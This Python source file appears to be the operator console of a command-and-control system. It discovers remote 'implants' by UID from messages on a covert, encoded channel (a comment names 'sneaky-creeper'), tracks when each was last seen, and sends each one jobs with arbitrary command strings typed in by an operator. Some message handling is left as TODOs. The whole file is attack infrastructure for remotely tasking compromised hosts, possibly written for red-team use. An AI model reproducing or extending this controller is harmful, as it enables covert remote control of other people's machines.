#! /usr/bin/env python

import os
import sys
import string
import random
import datetime
from time import sleep

from comms import Comms

from params import *

class CncComms(Comms):
    def __init__(self, channel, encoders, channelParams, encoderParams):
        super(CncComms, self).__init__(channel, encoders, channelParams, encoderParams)


class Client:
    def __init__(self, uid, comms, lastSeen=None):
        self.lastSeen = lastSeen
        self.uid = uid
        self.comms = comms
        self.jobs = []

    def __repr__(self):
        return "client {} last seen {}".format(
                self.uid, self.lastSeen)

    def sendJob(self, jobType, cmdString):
        jobId = ''.join([random.choice(string.ascii_letters + string.digits) for i in range(20)])

        self.jobs.append(Job(jobId, jobType))

        self.comms.send("{}:job:{}:{}:{}".format(self.uid, jobId, jobType, cmdString))


class Job:
    def __init__(self, jobId, jobType):
        self.jobId = jobId
        self.jobType = jobType
        self.created = datetime.datetime.now()
        self.executed = None


class Administrator():
    def __init__(self, comms):
        self.comms = comms
        self.clients = []

    def findByUids(self, uids):
        """ takes a list of UIDs (as strings) and returns clients with UIDs in
            that list """
        if not type(uids) is list:
            raise TypeError('findByUids expects a list of 1 or more UIDs')

        return [client for client in self.clients if client.uid in uids]

    def handleMessages(self):
        messages = self.comms.receive()

        self.discoverClients(messages)
        # TODO
        # jobs that need to be done whenever messages are updated go here
        #  - register completed jobs
        #  - display messages

    def discoverClients(self, messages):
        """ take a list of messages, and find every unique UID amongst them to
            identify unique clients """
        for message in messages:
            uid = message.split(":", 1)[0]
            # find if there are any preexisting clients with that UID
            clients = [c for c in self.clients if c.uid == uid]
            numClients = len(clients)
            if numClients < 1:
                client = Client(uid, self.comms)
                # we can't access the message timestamp from sneaky-creeper :(
                client.lastSeen = datetime.datetime.now()
                self.clients.append(client)
            elif numClients == 1:
                client = clients[0]
                client.lastSeen = datetime.datetime.now()
            else:
                print("More than one client with UID {}".format(uid))


if __name__ == "__main__":
    comms = CncComms(channel, encoders, channelParams, encoderParams)
    admin = Administrator(comms)
    try:
        while True:
            admin.handleMessages() # TODO do this in a thread

            uids = raw_input("Enter comma separated UIDs to send a command to: ")
            uids = uids.split(',')
            uids = [uid.strip() for uid in uids]

            jobName = raw_input("Enter the job name: ")
            cmdText = raw_input("Enter the parameters to send: ")

            implants = admin.findByUids(uids)
            for implant in implants:
                implant.sendJob(jobName, cmdText)

    except KeyboardInterrupt:
        pass
